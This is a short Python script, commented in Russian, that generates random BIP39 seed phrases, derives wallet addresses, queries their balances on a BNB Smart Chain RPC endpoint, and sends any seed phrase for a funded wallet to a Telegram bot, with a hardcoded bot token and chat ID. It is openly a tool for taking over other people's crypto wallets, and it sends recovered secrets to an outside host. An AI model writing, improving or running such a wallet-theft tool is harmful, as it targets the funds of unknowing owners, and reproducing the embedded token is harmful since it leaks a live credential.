import time
import requests
from eth_account import Account
from mnemonic import Mnemonic

# Твои данные
TELEGRAM_TOKEN = "8343501600:AAEO_yNSy1xLZdJ_tLlaazzteQvIvZeIAvQ"
TELEGRAM_CHAT_ID = "1632903931"

Account.enable_unaudited_hdwallet_features()
mnemo = Mnemonic("english")

# Настройки времени
START_TIME = time.time()
WORK_LIMIT = 5.5 * 3600 
REPORT_INTERVAL = 2 * 3600 # Отчет в Телеграм каждые 2 часа

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}, timeout=10)
    except: pass

def hunt():
    send_telegram("🛰 *Охота продолжается!* \n\nБот в сети. Буду слать отчеты каждые 2 часа.")
    
    count = 0
    last_report_time = time.time()
    
    while True:
        current_time = time.time()
        
        # 1. Проверка лимита сессии (5.5 часов)
        if current_time - START_TIME > WORK_LIMIT:
            send_telegram(f"⏳ *Сессия завершена.* \nВсего за этот заход проверено: `{count}` кошельков.")
            break

        # 2. Периодический отчет "Я жив" (раз в 2 часа)
        if current_time - last_report_time > REPORT_INTERVAL:
            send_telegram(f"📊 *Промежуточный отчет:* \nЗа последние 2 часа проверено: `{count}` фраз. Продолжаю поиск...")
            last_report_time = current_time

        # 3. Генерация и проверка
        words = mnemo.generate(strength=128)
        acct = Account.from_mnemonic(words)
        
        # Проверка баланса (раз в 30 итераций для стабильности)
        if count % 30 == 0:
            try:
                res = requests.post('https://bsc-dataseed.binance.org/', 
                                    json={"jsonrpc":"2.0","method":"eth_getBalance","params":[acct.address, "latest"],"id":1}, 
                                    timeout=5).json()
                balance = int(res['result'], 16)
                if balance > 0:
                    send_telegram(f"💰 *КЛАД НАЙДЕН!* 💰\n\nФраза: `{words}`\nАдрес: `{acct.address}`")
            except: pass
        
        count += 1
        if count % 1000 == 0:
            print(f"Checked: {count}")

if __name__ == "__main__":
    hunt()
